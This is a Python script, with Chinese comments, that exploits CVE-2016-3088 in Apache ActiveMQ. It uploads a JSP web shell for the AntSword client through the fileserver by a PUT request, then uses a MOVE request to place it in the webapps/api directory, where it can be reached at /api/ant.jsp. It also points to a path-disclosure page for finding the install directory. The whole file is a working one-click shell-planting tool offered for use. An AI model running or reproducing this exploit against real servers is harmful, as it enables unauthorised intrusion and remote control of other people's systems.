#! /usr/bin/env python3
# _*_  coding:utf-8 _*_
import argparse
import requests


def CVE_2016_3088(url, jsp_ma, move_root_path):
    headers_put = {
        'Content-Type': "application/json",
        'Accept-Encoding': "gzip, deflate",
        'Accept': "*/*",
        'Accept-Language': 'en-US;q=0.9,en;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Connection': 'close'
    }
    ant = open(jsp_ma, "r").read()  # 一句话木马，蚁剑密码ant
    data_put = ant
    URL = url + "/fileserver/ant"
    r = requests.put(url=URL, headers=headers_put, data=data_put)  # 提交PUT请求
    headers_move = {
        'Destination': "file://" + move_root_path + '/ant.jsp',  # 目标移动地址
        'Accept': "*/*",
        'Accept-Language': 'en-US;q=0.9,en;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Connection': 'close'
    }
    m = requests.request('MOVE', url=URL, headers=headers_move)  # 提交MOVE请求
    print("上传响应:" + str(r) + "\n访问参考该链接：" + url + "/api/ant.jsp\n响应请求：" + str(m))
    return '运行结束(204响应即表示成功)'


if __name__ == '__main__':
    # url = "http://127.0.0.1:8161"
    # ant = './ant'
    # path = '/opt/apache-activemq-5.11.1/webapps/api'
    # print(main.CVE_2016_3088(url=url, jsp_ma=ant, move_root_path=path))
    print("Tip*查看路径泄露 http://your-ip:8161/admin/test/systemProperties.jsp user.dir对应内容\n")
    parser = argparse.ArgumentParser(description='cve-2016-3088_activemq一键化getshell')
    parser.add_argument('-url', type=str, help='目标URL地址 例如：http://127.0.0.1:8161')
    parser.add_argument('-jsp_ma', type=str, help='jsp木马路径')
    parser.add_argument('--path', type=str, default='/opt/apache-activemq-5.11.1/webapps/api',
                        help='move请求移动的具体路径位置,默认/opt/apache-activemq-5.11.1/webapps/api')
    args = parser.parse_args()

    print(CVE_2016_3088(args.url, args.jsp_ma, args.path))
